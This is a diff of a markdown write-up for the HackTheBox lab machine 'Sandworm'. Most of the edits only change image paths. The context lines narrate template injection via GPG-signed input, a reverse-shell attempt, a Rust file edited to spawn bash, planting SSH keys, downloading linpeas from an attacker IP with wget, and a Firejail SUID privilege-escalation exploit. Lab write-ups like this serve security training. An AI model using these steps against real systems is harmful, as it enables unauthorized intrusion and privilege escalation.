@@ -23,7 +23,7 @@ Found a hostname `ssa.htb` , so add it to the: `/etc/hosts` file
 
 Lets navigate to it. Nothing Interesting here in this Page. 
 
-![](Pasted%20image%2020260820085836.png)
+![](/assets/img/posts/Pasted image 20260820085836.png)
 
 So I start to look for hidden directories/files a with common wordlist.
 ```
@@ -35,7 +35,7 @@ I found `admin` page but no Credentials. and I found `guide` page Interesting.
 ### Exploitation & Gaining Access
 There is a **Public Key** and **Signed Text** field. It takes **gpg key value** and **signed text** verified with that Key and it will Verify Signature.
 
-![[Pasted image 20250816235636.png]]
+!/assets/img/posts/Pasted image 20250816235636.png
 
 So now we have to generate a gpg key with command line.
 ```
@@ -75,16 +75,16 @@ password: A1234567
 
 This is my Public Key:
 
-![](Pasted%20image%2020260820090812.png)
+![](/assets/img/posts/Pasted image 20260820090812.png)
 
 
 This is my Signed Text:
 
-![](Pasted%20image%2020260820090855.png)
+![](/assets/img/posts/Pasted image 20260820090855.png)
 
 After putting this two Content into the Proper Field I press on Verify Signature and I found this below.
 
-![[Pasted image 20250816235814.png]]
+!/assets/img/posts/Pasted image 20250816235814.png
 
 I found **49** It is **jinja2** template engine. So it worked and it is exploitable.
 
@@ -121,11 +121,11 @@ Password: A1234567
 ```
 
 After making and putting those in input field I get the UID of user `atlas`.
-![[Pasted image 20250817000027.png]]
+!/assets/img/posts/Pasted image 20250817000027.png
 
 Then I change the `id` command with a reverse shell command but it shows Error. Not supporting `< >`.
 
-![](Pasted%20image%2020260820091504.png)
+![](/assets/img/posts/Pasted image 20260820091504.png)
 
 Removing the previous keys
 ```
@@ -193,7 +193,7 @@ We will finally arrived to this file
 cat admin.json
 ```
 
-![](Pasted%20image%2020260820092658.png)
+![](/assets/img/posts/Pasted image 20260820092658.png)
 
 
 So now we have a username, and  a password
@@ -231,7 +231,7 @@ silentobserver@sandworm:~$ ls -lah
 silentobserver@sandworm:~$ cat tipnet.d
 ```
 
-![](Pasted%20image%2020260820095823.png)
+![](/assets/img/posts/Pasted image 20260820095823.png)
 
 I found one of them has write Access. So I change the code with some shell code: https://doc.rust-lang.org/std/process/struct.Command.html
 ```
@@ -243,13 +243,13 @@ let output = Command::new("bash")
 .expect("failed to execute process")
 ```
 
-![](Pasted%20image%2020260820100111.png)
+![](/assets/img/posts/Pasted image 20260820100111.png)
 
 Setting our netcat listener, and get shell again with `Atlas` User.
 
 Here in `.ssh` folder I put my own `id_rsa.pub `file and rename it again with `authorized_keys` , then I use my own `id_rsa` to login as Atlas User.
 
-![](Pasted%20image%2020260820100407.png)
+![](/assets/img/posts/Pasted image 20260820100407.png)
 
 #### 2- Using linpeas.sh Script
 This time we will use `linpeas.sh` script to see if there anything we can use it to get to the root, but first lets download it to the HTB machine
@@ -266,7 +266,7 @@ silentobserver@sandworm:~$ wget 10.10.16.17:8000/linpeas.sh
 
 When I run linpeas.sh I found the following interesting file.
 
-![[Pasted image 20250817000428.png]]
+!/assets/img/posts/Pasted image 20250817000428.png
 
 It has SUID permission. So we can use that for Exploitation. I search in **Google** for `Firejail exploit.` , I found this: https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25
 
@@ -277,7 +277,7 @@ silentobserver@sandworm:~$ chmod +x fire-explit.py
 silentobserver@sandworm:~$ python3 fire-explit.py
 ```
 
-![](Pasted%20image%2020260820095203.png)
+![](/assets/img/posts/Pasted image 20260820095203.png)
 
 So I again open a shell as `atlas` user using SSH and `id_rsa`. And type the following command
 ```
